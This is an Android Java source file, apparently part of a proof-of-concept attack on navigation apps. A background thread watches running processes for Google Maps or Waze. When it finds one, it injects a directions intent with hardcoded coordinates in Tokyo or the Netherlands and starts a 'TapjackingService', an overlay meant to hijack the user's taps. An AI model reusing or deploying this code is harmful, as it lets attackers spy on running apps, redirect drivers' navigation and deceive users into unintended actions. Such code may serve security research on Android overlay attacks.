package com.test.www.navigationtest;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.Toast;

import com.jaredrummler.android.processes.ProcessManager;
import com.jaredrummler.android.processes.models.AndroidAppProcess;
import com.jaredrummler.android.processes.models.AndroidProcess;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;
import java.util.List;

import static com.test.www.navigationtest.MainActivity.*;

/**
 * Created by Dodobal-2 on 5/8/2016.
 */

class ListenActivity extends Thread{
    boolean exit = false;
    ActivityManager am = null;
    Context context = null;
    public static int flag=0;
    public ListenActivity(Context con){
        context = con;
        am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
    }

    public void run(){

        Looper.prepare();
        while(!exit){
            int currentapiVersion = android.os.Build.VERSION.SDK_INT;
            List<AndroidAppProcess> processes = ProcessManager.getRunningAppProcesses();
            for (AndroidAppProcess process:processes) {
                String pkgName = process.getPackageName();
                if (pkgName.contains("map") || pkgName.contains("waze")){
                    Toast.makeText(context, "Google Maps or waze is running", Toast.LENGTH_LONG).show();
                    Log.d("aaa","pkgname  " + pkgName);
                    Intent intent=new Intent(Intent.ACTION_VIEW, Uri.parse("http://maps.google.com/maps?saddr=35.6895,139.6917&daddr=35.6896,139.6921")); //Japan
                    //Intent intent=new Intent(Intent.ACTION_VIEW, Uri.parse("http://maps.google.com/maps?saddr=52.3702,4.8952&daddr=52.3703,4.8955")); //Nether
                    context.startActivity(intent);
                    context.startService(new Intent(TapjackingService.class.getName()));


                    flag=1;
                    exit=true;
                }
            }
        }
        Looper.loop();
    }


}
